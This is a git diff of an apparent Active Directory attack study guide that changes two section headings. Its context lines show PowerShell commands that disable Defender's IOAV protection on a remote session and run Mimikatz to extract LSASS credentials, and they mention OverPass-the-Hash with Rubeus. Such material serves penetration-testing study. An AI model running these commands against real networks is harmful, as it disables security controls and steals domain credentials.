@@ -7,7 +7,7 @@ tags: [Cert, Active Directory]     # TAG names should always be lowercase
 description: Designed to provide a comprehensive guide to Active Directory (AD) attack techniques
 ---
 
-## 5. Extract Credentials from LSASS - Invoke Mimikatz
+## 5. Extract Credentials from LSASS (Invoke Mimikatz)
 
 Once we have remote admin session on the remote machine, we will extract credentials from LSASS. Bear in mind , **to avoid LSASS unless you have nothing to do.**
 
@@ -36,7 +36,7 @@ Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Sess
 Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
 ```
 
-## 6. Using OverPass-the-Hash - Rubeus
+## 6. Using OverPass-the-Hash (Rubeus)
 
 Finally, use OverPass-the-Hash to use svcadmin's credentials.
 
